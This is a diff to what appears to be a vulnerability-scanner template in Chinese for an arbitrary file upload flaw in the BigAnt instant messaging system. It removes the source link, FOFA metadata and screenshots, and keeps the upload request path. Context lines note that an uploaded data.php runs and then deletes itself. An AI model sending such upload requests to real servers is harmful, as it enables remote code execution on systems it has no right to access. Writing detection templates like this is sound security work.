@@ -3,12 +3,8 @@ info:
   name: 大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qyy5l171phlqch9o'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qyy5l171phlqch9o
-    fofa: product="即时通讯系统"
 http:
 - raw:
   - 'POST /?m=api&c=dispersedOrg&a=upload_file HTTP/1.1
@@ -22,11 +18,8 @@ http:
 
     访问上传文件 data.php
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1772372259591-02b2c663-70fb-44b4-ad4c-5c0ab9e6f6da.png)
 
-    成功[执行](https://mrxn.net/tag/rce)我们上传的文件，并删除自身
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1772372259892-d3c753b4-0596-4355-93e0-bc3263508ffc.png)'
+    成功[执行](https://mrxn.net/tag/rce)我们上传的文件，并删除自身'
   redirects: false
   matchers:
   - status:
